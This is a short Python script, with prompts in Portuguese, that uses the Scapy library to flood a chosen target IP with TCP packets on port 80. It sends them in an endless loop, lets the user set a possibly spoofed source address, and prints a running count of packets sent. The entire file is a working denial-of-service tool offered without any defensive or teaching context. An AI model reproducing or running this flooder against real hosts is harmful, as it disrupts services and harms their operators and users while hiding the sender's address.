from scapy.all import *
from scapy.layers.inet import IP
from scapy.layers.inet import TCP


src = input("IP Origem: ")
dst = input("IP Destino: ")
sport = int(input("Porta de origem: "))
i = 1

while True:
    IP1 = IP(src=src, dst=dst)
    TCP1 = TCP(sport=sport, dport=80)
    pkt = IP1 / TCP1
    send(pkt, inter=.001)
    print("Enviado", i,  " Pacotes")
    i = i + 1
